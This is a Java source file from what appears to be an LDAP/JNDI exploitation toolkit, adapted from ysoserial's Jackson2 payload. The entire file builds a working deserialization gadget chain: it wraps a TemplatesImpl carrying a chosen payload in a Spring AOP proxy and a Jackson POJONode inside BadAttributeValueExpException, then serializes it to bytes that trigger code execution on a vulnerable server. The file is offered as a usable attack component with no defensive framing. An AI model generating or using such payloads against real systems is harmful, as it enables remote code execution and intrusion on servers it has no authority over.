package com.feihong.ldap.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.Gadgets;
import com.feihong.ldap.gadgets.utils.Reflections;
import com.feihong.ldap.utils.MyStaticMethodMatcherPointcut;
import com.feihong.ldap.utils.MyThrowsAdvice;
import com.feihong.ldap.utils.Util;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.Advisor;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.adapter.ThrowsAdviceInterceptor;
import org.springframework.aop.support.DefaultPointcutAdvisor;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

// from https://github.com/Y4er/ysoserial/blob/main/src/main/java/ysoserial/payloads/Jackson2.java
public class Jackson22 {

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object obj = getObject(type, param);

        byte[] bytes = Util.serialize(obj);

        return bytes;
    }

    public static Object getObject(PayloadType type, String... param) throws Exception {
//        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
//        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
//        ctClass.removeMethod(writeReplace);
//        ctClass.toClass();

        POJONode node = new POJONode(makeTemplatesImplAopProxy(type, param));

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val, "val", node);
        return val;
    }

    public static Object makeTemplatesImplAopProxy(PayloadType type, String... param) throws Exception {
        // use JdkDynamicAopProxy to make jackson better.
        // read this https://xz.aliyun.com/t/12846
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(type, param));

        MyThrowsAdvice throwsAdvice = new MyThrowsAdvice();
        ThrowsAdviceInterceptor interceptor = new ThrowsAdviceInterceptor(throwsAdvice){};

        MyStaticMethodMatcherPointcut pointcut = new MyStaticMethodMatcherPointcut(){};

        // 创建一个DefaultPointcutAdvisor
        Advisor advisor = new DefaultPointcutAdvisor(pointcut, interceptor);

        // 添加advisor到AdvisedSupport
        advisedSupport.addAdvisor(advisor);



        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
}
